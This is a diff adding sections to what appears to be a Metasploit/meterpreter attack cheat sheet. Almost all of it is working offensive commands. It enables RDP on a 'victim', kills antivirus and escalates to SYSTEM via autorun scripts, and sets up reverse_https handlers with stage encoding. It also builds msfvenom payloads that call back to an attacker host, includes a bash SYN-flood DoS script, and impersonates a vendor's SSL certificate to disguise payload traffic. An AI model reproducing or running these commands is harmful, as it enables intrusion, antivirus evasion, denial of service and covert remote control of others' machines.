@@ -632,6 +632,150 @@ transport next
 transport prev
 ```
 
+## Enable RDP
+
+enable RDP on victim machine use rdesktop to connect
+
+```
+run getgui -e
+```
+
+## Script Automation
+
+#### put the meterpreter commands in a .rc file setup meter and set the autorun script path:.
+
+example:
+
+#### migrate o explorer.exe and dump system credential
+
+```
+set AutoRunScript  /root/autoruncommands.rc
+
+migrate -N explorer.exe
+getsystem
+run post/windows/manage/killav
+run post/windows/gather/checkvm
+getuid
+```
+
+we can automate the whole thing too.
+
+For example, using a standard editor, we will create a script in our home directory named setup.rc. In this script, we will set the payload to windows/meterpreter/reverse\_https and configure the relevant LHOST and LPORT parameters. We also enable stage encoding using the x86/shikata\_ga\_nai encoder and configure the post/windows/manage/migrate module to be executed automatically using the AutoRunScript option. This will cause the spawned meterpreter to automatically launch a background notepad.exe process and migrate to it. Finally, the ExitOnSession parameter is set to “false” to ensure that the listener keeps accepting new connections and the module is executed with the -j and -z flags to stop us from automatically interacting with the session. The commands for this are as follows:
+
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.11.0.4
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false
+exploit -j -z
+```
+
+```
+sudo msfconsole -r setup.rc
+```
+
+With the listener configured and running, we can, for example, launch an executable containing a meterpreter payload from our Windows VM. We can create this executable with msfvenom :
+
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443 -f exe -o met.exe
+```
+
+When executed, our multi/handler accepts the connection
+
+we can specify scripts manually after getting a session:
+
+```
+meterrpreter> resource script.rc
+```
+
+## Bash Automation
+
+we can write bash scripts to automate the tasks: example: a dos attack.
+
+```
+ #!/bin/bash
+ TARGET
+ echo " Choose who to DDoS (IP address ONLY), use nslookup < URL> to get IP address"
+ read TARGET
+ msfconsole -q -x "use auxiliary/dos/tcp/synflood;set RHOST $TARGET; exploit;
+```
+
+## Payloads with Trusted SSL Certificates
+
+configure a domain in `zinitiative.com` and use lets enrypt to get a certificate after configuring the domain DNS servers to point to the `digitalocean` droplet getting a certificate with lets encrypt is very simple.
+
+first install letsencrypt:
+
+```
+apt install lets encrypt -y
+```
+
+generate a cert
+
+```
+letsencrypt cartonly --manual -d zinitiative.com
+```
+
+we should have a cert under `/etc/letsencrypt/live/zinitiative.co`m directroy
+
+before we can move on we will have to creare a unified file containng privkey.pem and cert.pem:
+
+```
+cd /etc/letsencrypt/live/zinitiative.com 
+cat privkey.pem cert.pem >> /root/unified.pem
+```
+
+now in msfconsole set the cert
+
+```
+set lhost zinitiative.com
+set lport 443
+set handlersslcert /root/unified.pem
+set stagetverifysslcert true
+set enablestageencoding true
+run
+```
+
+## Using Payloads with HTTP SSL
+
+```
+use auxiliary/gather/impersonate_ssl
+
+# we use symantec websit as an example:
+set rhost www.symantec.om
+run
+```
+
+![](<../.gitbook/assets/image (296).png>)
+
+we have the cert now create a payload using the cert:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhosrt=1.2.3.4 lport=1234 handlersslcert=/root/.msf5/loot/fsdvd/cert.pem stagerverifysslcert=true -f exe -o payload.exemsfvenom -p windows/meterpreter/reverse_tcp lhosrt=1.2.3.4 lport=1234 handlersslcert=/root/.msf5/loot/fsdvd/cert.pem stagerverifysslcert=true -f exe -o payload.exe
+```
+
+in handler setting:
+
+```
+set handlersslcert [file.pem]
+set stagerverifysslcert true
+run
+```
+
+![](<../.gitbook/assets/image (276).png>)
+
+####
+
+
+
+
+
+
+
 
 
 
